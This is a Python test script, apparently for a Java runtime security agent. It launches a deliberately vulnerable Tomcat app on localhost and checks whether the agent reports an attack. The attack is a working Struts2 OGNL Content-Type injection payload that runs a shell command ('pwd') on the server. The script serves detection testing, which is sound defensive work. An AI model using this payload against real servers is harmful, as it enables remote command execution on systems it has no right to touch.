#!/usr/bin/env python3
import atexit
import json
import os
import subprocess
import sys
from os import path
from time import sleep
from urllib.error import URLError
from urllib.request import urlopen, Request

import homebase_dir


def main():
    h = homebase_dir.HomebaseMock("""
projectId=PROJECT_ID
homeBaseUrl=file://OUTPUT_PATH/

logTo=stderr

heartBeatIntervalMs=500
reportIntervalMs=1000
""")

    subprocess.check_output(['mvn', '-q', 'tomcat7:help'], cwd='java-goof')

    opts_env = os.environ.copy()
    opts_env['MAVEN_OPTS'] = '-javaagent:{}=file://{}'.format(
        path.join(os.getcwd(), 'build/libs/snyk-java-runtime-agent.jar'),
        h.config_path
    )
    victim = subprocess.Popen(['mvn', 'tomcat7:run'], env=opts_env, cwd='java-goof')

    atexit.register(lambda: victim.kill())

    tomcat = 'http://localhost:8080/'

    for i in range(30):
        try:
            with urlopen(tomcat) as _:
                break
        except URLError as _:
            print('>>> still waiting for tomcat startup, {}/30...'.format(i))
            sleep(1)

    req = Request(tomcat, headers={
        'Content-type': "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?("
                        "#_memberAccess=#dm):((#container=#context["
                        "'com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance("
                        "@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear("
                        ")).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).("
                        "#cmd='pwd').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).("
                        "#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=("
                        "@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).("
                        "@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    })

    # run the exploit
    with urlopen(req) as _:
        pass

    # wait for an agent report
    sleep(2)
    victim.terminate()
    sleep(1)

    # this segment is purely for documentation generation
    doc_events = dict()
    doc_heartbeat = dict()
    doc_metadata = dict()

    for doc in h.all_seen_docs():
        if 'eventsToSend' in doc:
            print()
            doc_events = doc
            json.dump(doc, sys.stdout)

        if 'heartbeat' in doc:
            print()
            doc_heartbeat = doc
            json.dump(doc, sys.stdout)

        if 'loadedSources' in doc:
            doc_metadata = doc

    print('\n\n>>> events document:')
    json.dump(doc_events, sys.stdout)

    print('\n\n>>> heartbeat document:')
    json.dump(doc_heartbeat, sys.stdout)

    print('\n\n>>> metadata document:')
    json.dump(doc_metadata, sys.stdout)

    success = False
    for event in h.all_seen_events():
        success = success or event['methodEntry']['methodName'].startswith(
            'org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest')

    if not success:
        print('\n\nNo events matched:')
        for event in h.all_seen_events():
            json.dump(event, sys.stdout)
            print()
        sys.exit(4)

    print('\n\nSuccess!')


if '__main__' == __name__:
    main()
